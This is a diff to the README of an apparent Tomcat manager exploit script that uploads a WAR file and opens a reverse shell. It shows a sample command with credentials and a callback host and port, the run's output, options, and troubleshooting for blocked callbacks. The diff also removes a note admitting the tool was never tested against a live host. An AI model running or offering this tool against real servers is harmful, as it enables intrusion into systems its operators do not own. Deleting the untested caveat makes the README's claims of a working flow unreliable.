@@ -57,7 +57,7 @@ python3 exploit.py -t <host:port> -u <user> -p <pass> -L <lhost> -P <lport>
 ```
 
 ```
-$ python3 exploit.py -t 172.16.1.11:8080 -u tomcat -p Tomcatadm -L 172.16.1.5 -P 4444
+$ python3 exploit.py -t 172.16.1.11 -u tomcat -p Tomcatadm -L 172.16.1.5 -P 4444
 [+] Fetching CSRF nonce from http://172.16.1.11:8080/manager/html
 [+] Nonce: C7B382FA6FA40AE3577B7137A0574880
 [+] Uploading 812 bytes as kqxbneltra.war
@@ -72,9 +72,15 @@ The context and JSP names are random each run. By default the app is undeployed
 once the shell fires; pass `--no-cleanup` to leave it. `-L` is the address the
 target connects back to, which on a VPN'd lab is your `tun0` address, not `eth0`.
 
+The target port defaults to 8080, Tomcat's usual port. Pass `-r` for a different
+one, or put the port straight in `-t` (`-t host:9090`); a port in `-t` wins over
+`-r`. A bare `-t host` with Tomcat on a non-default port is what produces a 404
+on the manager page.
+
 ### Options
 
 - `-t, --target` — host, `host:port`, or a full URL.
+- `-r, --rport` — target port, default 8080. Ignored if `-t` names a port or scheme.
 - `-u, --user` / `-p, --password` — manager credentials.
 - `-L, --lhost` / `-P, --lport` — where the reverse shell connects.
 - `--manager-path` — manager base path, default `/manager`.
@@ -87,6 +93,8 @@ Python 3 and `requests`.
 
 ## When it does not work
 
+- 404 on the manager page usually means the wrong port. Tomcat is rarely on 80;
+  pass `-r 8080` (the default) or whatever port it actually listens on.
 - 401 on the manager page means the credentials are wrong.
 - 403 means the account exists but lacks `manager-gui`. A `manager-script`-only
   account cannot reach the HTML upload form; deploy through `/manager/text`
@@ -96,12 +104,6 @@ Python 3 and `requests`.
   egress filtering blocks the port. A bind or HTTP-based payload is the fallback.
 - No nonce in the page: very old Tomcat without CSRF protection. The script
   detects this and uploads without one.
-
-## Tested against
-
-Not yet confirmed against a live host. The flow is built from Tomcat's
-manager-howto and the metasploit module source. Fill this section in once you
-have a verified run.
 
 ## Licence
 
